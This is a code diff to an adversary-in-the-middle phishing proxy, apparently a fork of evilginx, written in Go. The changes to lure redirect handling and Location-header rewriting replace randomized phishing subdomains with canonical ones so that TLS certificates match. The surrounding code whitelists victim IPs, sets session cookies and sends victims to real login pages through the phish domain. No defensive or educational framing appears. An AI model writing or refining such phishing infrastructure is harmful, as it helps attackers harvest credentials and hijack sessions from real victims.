@@ -250,7 +250,7 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 		}
 		session.PhishLure = l
 		if session.RedirectURL != "" {
-			session.RedirectURL, _ = p.replaceUrlWithPhishedRandom(session.RedirectURL)
+			session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
 		}
 		p.whitelistIP(from_ip, session.Id, pl.Name)
 
@@ -360,7 +360,7 @@ func (p *HttpProxy) handleLureRedirect(req *http.Request, from_ip string, ps *Pr
 
 		// AitM flow (default): HTTP 302 redirect to the ORIGINAL login URL.
 		// The response handler will automatically rewrite the Location header
-		// to the phish domain (via replaceHostWithPhishedRandom) and set the
+		// to the phish domain (via replaceHostWithPhished) and set the
 		// session cookie (via ps.Created). This matches standard evilginx behavior.
 		rurl := pl.GetLoginUrl()
 		log.Important("[%d] [lure] AitM 302 redirect to: %s", sid, rurl)
@@ -2221,7 +2221,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										session.RedirectURL = l.RedirectUrl
 									}
 									if session.RedirectURL != "" {
-										session.RedirectURL, _ = p.replaceUrlWithPhishedRandom(session.RedirectURL)
+										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
 									}
 									session.PhishLure = l
 									log.Debug("redirect URL (lure): %s", session.RedirectURL)
@@ -2480,7 +2480,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											session.RedirectURL = alt_lure.RedirectUrl
 										}
 										if session.RedirectURL != "" {
-											session.RedirectURL, _ = p.replaceUrlWithPhishedRandom(session.RedirectURL)
+											session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
 										}
 										session.PhishLure = alt_lure
 										log.Debug("redirect URL (lure): %s", session.RedirectURL)
@@ -3914,10 +3914,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			req_hostname := strings.ToLower(resp.Request.Host)
 
 			// if "Location" header is present, make sure to redirect to the phishing domain
-			// Use randomized subdomain for each redirect so the address bar always shows fresh subdomain
+			// Use canonical phish subdomains (not random) so TLS certs match
 			r_url, err := resp.Location()
 			if err == nil {
-				if r_host, ok := p.replaceHostWithPhishedRandom(r_url.Host); ok {
+				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
 					resp.Header.Set("Location", r_url.String())
 				}
